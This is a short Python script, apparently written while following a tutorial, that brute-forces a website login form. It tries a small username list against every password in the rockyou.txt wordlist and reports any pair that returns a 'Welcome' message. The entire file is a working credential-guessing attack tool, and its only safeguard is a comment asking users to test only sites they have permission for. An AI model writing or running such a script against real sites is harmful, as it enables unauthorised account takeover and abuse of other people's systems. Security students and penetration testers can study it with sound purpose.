#!/bin/python3

import requests
import sys

target = "http://targetsitesurl.com" #Target web page. Only use this on sites you have permission to test.
usernames = ["carrot", "test", "admin"] #Username list
passwords = "/usr/share/wordlists/rockyou.txt" #Password wordlist
failure_string = "Incorrect username or password" #Failure message
success_string = "Welcome" #Success message

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Accept-Language': 'en-US,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://example.com/',
    'Content-Type': 'application/json',
} #This was not in the tutorial but good luck making any requests without custom headers lol

#response = requests.post(target, data={"username": "test", "password": "test"}, headers=headers)
#print(response.content)
#The 2 lines of code above this line were for testing purposes

for username in usernames:
	with open(passwords, "r") as pw_list:
		for pw in pw_list:
			pw = pw.strip("\n").encode()
			print(f"[X] Attempting  {username}:{pw.decode()}", end="\r", flush=True)
			r = requests.post(target, data={"username": username, "password": pw}, headers=headers)
			#if failure_string.encode() not in r.content:
			#Replace the line below with the line above if you want to look for a failur string instead
			if success_string.encode() in r.content:
				print(f"[+] Valid credentials found  {username}:{pw.decode()}\n")
				#sys.exit() optional
		else:
			print(f"\t[X] No passwords found for {username} in password list!")
